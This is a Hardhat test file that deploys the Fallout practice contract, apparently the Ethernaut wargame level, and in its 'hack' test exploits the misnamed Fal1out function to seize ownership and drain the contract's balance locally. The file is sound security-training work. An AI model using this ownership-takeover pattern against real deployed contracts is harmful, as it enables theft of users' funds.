import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import chai, { expect } from "chai";
import { solidity } from "ethereum-waffle";
import { deployments, ethers } from "hardhat";

import { Fallout } from "../typechain";

chai.use(solidity);

describe("DepoExchange", () => {
  let owner: SignerWithAddress;
  let tester: SignerWithAddress;

  let falloutInstance: Fallout;

  beforeEach(async () => {
    const signers = await ethers.getSigners();
    owner = signers[0];
    tester = signers[1];

    const receipt = await deployments.deploy("Fallout", {
      from: owner.address,
      args: [],
      log: true,
    });
    falloutInstance = await ethers.getContractAt("Fallout", receipt.address);
  });

  describe("Fallout", async () => {
    context("allocate", async () => {
      it("owner should be allocate", async () => {
        await falloutInstance
          .connect(tester)
          .allocate({ value: ethers.utils.parseEther("0.01") });
        expect(
          await falloutInstance.allocatorBalance(tester.address)
        ).to.be.equal(ethers.utils.parseEther("0.01"));
      });

      it("sendAllocation should be transfer ETH.", async () => {
        await falloutInstance.sendAllocation(tester.address);
        expect(
          await ethers.provider.getBalance(falloutInstance.address)
        ).to.be.equal(0);
      });
    });

    context("hack", async () => {
      it("hacking fallout", async () => {
        await falloutInstance
          .connect(tester)
          .Fal1out({ value: ethers.utils.parseEther("0.01") });

        expect(await falloutInstance.owner()).to.be.equal(tester.address);

        await falloutInstance.connect(tester).collectAllocations();

        expect(
          await ethers.provider.getBalance(falloutInstance.address)
        ).to.be.equal(0);
      });
    });
  });
});
